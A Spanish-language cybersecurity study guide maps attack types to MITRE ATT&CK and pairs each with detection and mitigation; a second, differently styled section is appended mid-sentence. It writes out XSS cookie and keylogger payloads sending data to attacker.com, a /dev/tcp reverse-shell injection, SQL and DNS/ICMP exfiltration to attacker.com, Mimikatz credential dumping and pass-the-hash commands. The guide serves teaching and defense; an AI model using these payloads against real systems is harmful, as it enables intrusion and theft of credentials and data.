# Taxonomía y Análisis de Ataques Cibernéticos

## 1. Marco teórico: MITRE ATT&CK Framework

### 1.1 Cyber kill chain (Lockheed Martin)

```
1. Reconocimiento    → Identificación de objetivos
2. Armamento         → Creación de payload/exploit
3. Entrega           → Transmisión del arma
4. Explotación       → Ejecución del código malicioso
5. Instalación       → Persistencia en el sistema
6. Comando y Control → Establecimiento de C2
7. Acciones          → Exfiltración, destrucción, etc.
```

### 1.2 MITRE ATT&CK: Tácticas y Técnicas

**Tácticas Principales:**
- **TA0001** - Initial Access
- **TA0002** - Execution
- **TA0003** - Persistence
- **TA0004** - Privilege Escalation
- **TA0005** - Defense Evasion
- **TA0006** - Credential Access
- **TA0007** - Discovery
- **TA0008** - Lateral Movement
- **TA0009** - Collection
- **TA0010** - Exfiltration
- **TA0011** - Command and Control
- **TA0040** - Impact

---

## 2. Ataques de ingeniería social

### 2.1 Phishing (T1566)

**Variantes:**
- **Spear Phishing**: Dirigido a individuos específicos
- **Whaling**: Dirigido a ejecutivos de alto nivel
- **Smishing**: Phishing vía SMS
- **Vishing**: Phishing vía llamada telefónica
- **Clone Phishing**: Copia de email legítimo con enlace malicioso

**Indicadores Forenses:**
```bash
# Análisis de headers de email
grep "Received:" suspicious_email.eml
grep "X-Originating-IP:" suspicious_email.eml
grep "Return-Path:" suspicious_email.eml

# URLs ofuscadas
echo "http://bit.ly/xxxxx" | curl -sI | grep Location

# Análisis de adjuntos
file attachment.doc
exiftool attachment.doc
olevba attachment.doc  # Macros VBA

# VirusTotal lookup
vt-cli file attachment.doc
```

**Contramedidas:**
- **SPF, DKIM, DMARC**: Verificación de remitente
- **Email Gateway**: Filtrado de contenido
- **User Awareness Training**: SANS Security Awareness
- **Simulaciones**: PhishMe, KnowBe4

---

## 3. Malware

### 3.1 Ransomware (T1486)

**Familias Notables:**
- **WannaCry** (2017): EternalBlue (MS17-010)
- **NotPetya** (2017): Wiper disfrazado de ransomware
- **Ryuk** (2018): Targeting corporativo, exfiltración previa
- **REvil/Sodinokibi** (2019): RaaS (Ransomware-as-a-Service)
- **Conti** (2020): Double extortion
- **LockBit 3.0** (2022): Evasión avanzada, affiliates

**Análisis Forense:**
```bash
# Identificar algoritmo de cifrado
strings malware.exe | grep -iE "aes|rsa|chacha"

# Buscar notas de rescate
find / -name "*DECRYPT*" -o -name "*README*" -o -name "*RECOVER*"

# Extensiones cifradas
find /data -type f | awk -F. '{print $NF}' | sort | uniq -c | sort -rn

# Descifrado (si disponible)
# No More Ransom: https://www.nomoreransom.org/
```

**Prevención:**
```bash
# Backups offline (3-2-1 rule)
rsync -avz --delete /data/ /backup/offline/

# Network segmentation
iptables -A FORWARD -s 192.168.1.0/24 -d 192.168.2.0/24 -j DROP

# Application whitelisting (AppLocker, Windows Defender Application Control)
# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

### 3.2 Trojanos y Backdoors (T1219, T1205)

**Familias:**
- **Emotet**: Downloader modular, spreading via email
- **TrickBot**: Banking trojan, credential harvesting
- **Cobalt Strike Beacon**: Post-exploitation framework (legítimo, usado por atacantes)
- **Meterpreter**: Metasploit payload en memoria

**Detección:**
```bash
# Procesos con conexiones externas
netstat -anp | grep ESTABLISHED | grep -v "127.0.0.1\|::1"

# Scheduled tasks sospechosas
schtasks /query /fo LIST /v | findstr /i "system32"

# Persistencia via registro
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Memory analysis con Volatility
volatility -f memory.dmp --profile=Win10x64_19041 malfind
```

### 3.3 APT Malware

**Grupos APT Notables:**
- **APT29 (Cozy Bear)**: SolarWinds attack, sophisticated supply chain
- **APT28 (Fancy Bear)**: Militar, phishing avanzado
- **Lazarus Group**: Ataques financieros, WannaCry attribution
- **APT41**: Doble propósito (espionaje + financial gain)

**TTPs Comunes:**
- Living-off-the-land (LOLBins): PowerShell, WMI, regsvr32
- Fileless malware: Ejecución solo en memoria
- Lateral movement: PsExec, WMI, DCOM
- C2: HTTPS, DNS tunneling, cloud services (Dropbox, OneDrive)

---

## 4. Ataques de Red

### 4.1 DDoS (Distributed Denial of Service)

**Tipos:**
- **Volumétrico**: UDP flood, ICMP flood, DNS amplification
- **Protocolo**: SYN flood, fragmentation attacks
- **Aplicación**: HTTP flood, Slowloris, RUDY

**Amplification Attacks:**
```bash
# DNS amplification factor: hasta 179x
dig ANY example.com @8.8.8.8

# NTP amplification: hasta 556x
ntpdc -c monlist target_ntp_server

# Memcached amplification: hasta 51,000x
echo -e "\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n" | nc -u target 11211
```

**Mitigación:**
```bash
# Rate limiting (iptables)
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# SYN cookies
sysctl -w net.ipv4.tcp_syncookies=1

# BGP Flowspec (ISP level)
# CDN/DDoS Protection: Cloudflare, Akamai, AWS Shield
```

### 4.2 Man-in-the-Middle (T1557)

**Técnicas:**
- **ARP Spoofing**: Envenenamiento de tabla ARP
- **DNS Spoofing**: Respuestas DNS falsas
- **SSL Stripping**: Degradación HTTPS → HTTP
- **Rogue Access Point**: AP falso con SSID legítimo

**Ejecución:**
```bash
# ARP spoofing con ettercap
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# SSL strip
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Captura de tráfico
tcpdump -i eth0 -w mitm_capture.pcap
```

**Detección:**
```bash
# Monitoreo ARP
arpwatch -i eth0

# Detección de rogue AP
airodump-ng wlan0mon

# Certificate pinning violations
# HSTS (HTTP Strict Transport Security)
```

---

## 5. Ataques web

### 5.1 SQL Injection (T1190)

**Tipos:**
- **In-band**: Resultados directos en misma respuesta
- **Blind**: Inferencia basada en comportamiento
- **Out-of-band**: Exfiltración via DNS/HTTP secundario

**Ejemplos:**
```sql
-- Authentication bypass
' OR '1'='1' --
admin'--

-- Union-based
' UNION SELECT null, username, password FROM users--

-- Time-based blind
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--

-- Out-of-band (DNS)
'; DECLARE @data varchar(max); SET @data=(SELECT TOP 1 password FROM users); 
   EXEC('master..xp_dnslog '''+@data+'.attacker.com''')--
```

**Detección y Prevención:**
```bash
# WAF rules (ModSecurity)
SecRule REQUEST_URI|ARGS "@rx (?i:union.*select|exec.*xp_|sleep\(|benchmark\()" \\
  "id:1000,phase:2,block,log"

# Prepared statements (ejemplo PHP)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);

# Input validation
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) { die("Invalid input"); }
```

### 5.2 Cross-site scripting (XSS) (T1189)

**Tipos:**
- **Stored XSS**: Payload persistente en DB
- **Reflected XSS**: Payload en URL reflejado
- **DOM-based XSS**: Manipulación client-side

**Payloads:**
```html
<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>

<!-- BeEF hook -->
<script src="http://attacker.com:3000/hook.js"></script>
```

**Prevención:**
```javascript
// Output encoding
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

### 5.3 Command injection (T1059)

```bash
# Vulnerable code (PHP)
system("ping -c 4 " . $_GET['host']);

# Exploitation
http://target.com/ping.php?host=8.8.8.8;cat%20/etc/passwd

# Reverse shell
http://target.com/ping.php?host=8.8.8.8;bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261

# Prevention: input sanitization
escapeshellarg($_GET['host'])
```

---

## 6. Credential attacks

### 6.1 Password cracking

```bash
# Dictionary attack
john --wordlist=rockyou.txt hashes.txt

# Rule-based
john --wordlist=wordlist.txt --rules hashes.txt

# Brute-force
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# GPU acceleration
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --force

# Rainbow tables (obsoleto con salt)
rcrack tables/ -f hashes.txt
```

### 6.2 Pass-the-Hash (T1550.002)

```powershell
# Dump de NTLM hashes (Mimikatz)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::msv

# Pass-the-Hash con psexec (Impacket)
psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@192.168.1.100

# Mitigación
# - Deshabilitar NTLM authentication
# - Protected Users security group
# - Credential Guard (Windows 10+)
```

### 6.3 Kerberoasting (T1558.003)

```powershell
# Request TGS tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webapp.domain.com"

# Export tickets
mimikatz # kerberos::list /export

# Crack offline
hashcat -m 13100 ticket.kirbi wordlist.txt

# Detección: Event ID 4769 con encryption type 0x17
```

---

## 7. Post-Exploitation

### 7.1 Lateral movement (TA0008)

**Técnicas:**
```powershell
# PsExec
PsExec.exe \\192.168.1.100 -u admin -p pass cmd.exe

# WMI
wmic /node:192.168.1.100 /user:admin process call create "cmd.exe"

# PowerShell Remoting
Enter-PSSession -ComputerName 192.168.1.100 -Credential (Get-Credential)

# RDP with stolen credentials
mstsc /v:192.168.1.100 /admin
```

**Detección:**
```bash
# Windows Event IDs
# 4624 Type 3: Network logon
# 4672: Special privileges assigned
# 4688: Process creation
# 5140: Network share accessed
```

### 7.2 Data exfiltration (TA0010)

**Canales:**
- **HTTP/HTTPS**: POST requests, file uploads
- **DNS Tunneling**: Base64 en subdominios
- **ICMP**: Datos en payload
- **Cloud Storage**: Dropbox, OneDrive, Google Drive
- **Steganography**: Datos en imágenes

```bash
# DNS exfiltration
for chunk in $(cat data.txt | base64 | fold -w 32); do
  dig $chunk.attacker.com @attacker_dns_server
done

# ICMP exfiltration
xxd -p data.txt | while read line; do
  ping -c 1 -p $line attacker.com
done

# Detection: anomalous data volume
tshark -r capture.pcap -qz io,phs | grep -A5 DNS
```

---

## 8. Supply chain attacks (T1195)

**Casos Notables:**
- **SolarWinds (2020)**: Trojanizado Orion, 18,000 clientes afectados
- **Codecov (2021)**: Script malicioso en bash uploader
- **Log4Shell (2021)**: Vulnerabilidad crítica en Log4j

**Mitigación:**
```bash
# Software Bill of Materials (SBOM)
cyclonedx-cli generate -o sbom.json

# Dependency scanning
npm audit
pip-audit
snyk test

# Code signing verification
gpg --verify software-1.0.tar.gz.sig

# Container image scanning
trivy image nginx:latest
```

---

## 9. Zero-day exploits (T1203)

**Ejemplos Históricos:**
- **EternalBlue** (MS17-010): SMBv1 RCE
- **BlueKeep** (CVE-2019-0708): RDP RCE
- **ProxyLogon** (CVE-2021-26855): Exchange Server
- **Log4Shell** (CVE-2021-44228): Log4j JNDI injection

**Threat Intelligence:**
```bash
# CVE monitoring
curl -s https://cve.mitre.org/data/downloads/allitems.csv | grep "2024"

# Exploit-DB search
searchsploit microsoft exchange

# Patch management
wuauclt /detectnow /updatenow  # Windows
apt update && apt upgrade -y   # Debian/Ubuntu
```

---

## 10. Defensa en Profundidad

### 10.1 Capas de Seguridad

```
1. Políticas y Procedimientos
2. Seguridad Física
3. Perímetro de Red (Firewall, IPS)
4. Red Interna (Segmentación, VLAN)
5. Host (Antivirus, EDR, HIPS)
6. Aplicación (WAF, input validation)
7. Datos (Cifrado, DLP)
```

### 10.2 Detection & Response

```bash
# SIEM correlation
index=security EventCode=4625 | stats count by src_ip | where count > 10

# Threat Hunting con OSQuery
SELECT * FROM processes WHERE path NOT LIKE 'C:\\Windows\\%' AND path NOT LIKE 'C:\\Program Files%';

# EDR telemetry
# - Process creation chain
# - Network connections
# - File modifications
# - Registry changes
```

### 10.3 Frameworks de Respuesta

- **NIST SP 800-61**: Computer Security Incident Handling Guide
- **SANS Incident Response Process**: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned
- **MITRE ATT&CK Navigator**: Mapeo de detección y cobertura

---

## 11. Referencias académicas

### Papers fundamentales
- Stoll, C. (1988). "Stalking the Wily Hacker" - Primer análisis de intrusion
- Denning, D. (1987). "An Intrusion-Detection Model"
- Cheswick, B. & Bellovin, S. (1994). "Firewalls and Internet Security"

### Libros esenciales
- Schneier, B. (2015). *Data and Goliath*
- Anderson, R. (2020). *Security Engineering, 3rd Ed.*
- Mitnick, K. (2011). *The Art of Deception*

### Recursos online
- **MITRE ATT&CK**: https://attack.mitre.org/
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **CWE (Common Weakness Enumeration)**: https://cwe.mitre.org/

### Certificaciones
- **OSCP** (Offensive Security Certified Professional)
- **GPEN** (GIAC Penetration Tester)
- **CEH** (Certified Ethical Hacker)
- **GCIH** (GIAC Certified Incident Handler)  
Suele originarse por falta de validación de entradas.

## 💥 Cross-site scripting (XSS)  
Inserción de scripts maliciosos en páginas web que se ejecutan en el navegador de la víctima.  
Permite robar cookies, suplantar sesiones o modificar la interfaz del sitio.

## 🔑 Credential stuffing / fuerza bruta  
- **Credential stuffing**: uso automático de credenciales filtradas para intentar acceder a cuentas.  
- **Brute force**: prueba sistemática y masiva de contraseñas.  
Ambas técnicas buscan **accesos no autorizados** a servicios.

## 🔗 Supply chain attacks  
Ataques dirigidos a **proveedores, servicios externos o software de terceros**, que luego se utilizan como vía para comprometer a una organización final.  
Afectan a actualizaciones, librerías, integraciones y hardware.

## 🧑‍💼 Insider threat  
Amenazas provenientes **desde dentro de la organización**, ya sea por empleados, proveedores o socios.  
Pueden ser intencionadas (sabotaje, filtraciones) o accidentales (errores).

## 🕳️ Zero-day Exploits  
Ataques que se aprovechan de **vulnerabilidades desconocidas** por el fabricante y aún sin parche.  
Suelen tener un alto impacto debido a la falta de protección específica.

---

## 📦 Otros ataques relevantes (opcional para ampliar)

- 🧪 Ingeniería social: Manipulación psicológica para obtener información, acceso o ejecutar acciones que comprometan la seguridad.
- 🛰️ Spoofing: Suplantación de identidad (IP, email, DNS) para engañar a sistemas o usuarios.
- 🧷 Ataques a API: Explotación de fallos en interfaces de programación mal protegidas para extraer información o tomar control de servicios.
- 🧩 Vulnerabilidades de configuración (Misconfiguration): Servidores, redes o aplicaciones con configuraciones débiles como puertos abiertos, permisos excesivos o credenciales por defecto.

--- 

# 🛡️ Pasos para controlar las vías de ataque

Las vías de ataque suelen aprovechar vulnerabilidades humanas, organizativas, técnicas o de configuración. Para mitigarlas, es necesario actuar en ambos frentes.

## 👥 1. Frente a vulnerabilidades humanas y organizativas

- **Formación y concienciación**  
  Capacitar al personal en buenas prácticas de seguridad.

- **Aplicación de políticas de uso**  
  Definir restricciones, usos permitidos y posibles sanciones por incumplimiento.

- **Establecimiento de acuerdos desde el inicio**  
  Incluir compromisos de seguridad al contratar servicios externos.

- **Asignación de responsables de seguridad**  
  Identificar responsables de cada servicio TIC y asegurar su formación y competencia.

## 🖥️ 2. Frente a fallos técnicos y de configuración

- **Inventario de activos**  
  Identificar activos propios y de proveedores TI, incluyendo sus vulnerabilidades.  
  Contratar una auditoría si es necesario.

- **Análisis de riesgos**  
  Evaluar amenazas, impacto potencial y nivel de preparación.

- **Política de actualizaciones**  
  Mantener activos actualizados y correctamente configurados.  
  Considerar reemplazar o dejar de usar activos que no puedan actualizarse.

- **Protección de comunicaciones y redes Wi-Fi**  
  Asegurar configuraciones robustas y uso de cifrado adecuado.

- **Monitorización continua**  
  Supervisar accesos a redes y servicios.  
  Utilizar herramientas de detección de intrusiones (IDS/IPS).

- **Gestión de permisos y accesos**  
  - Controlar y revisar privilegios.  
  - Exigir doble factor de autenticación (2FA) en servicios críticos.  
  - Establecer procedimientos de cambio periódico de contraseñas.
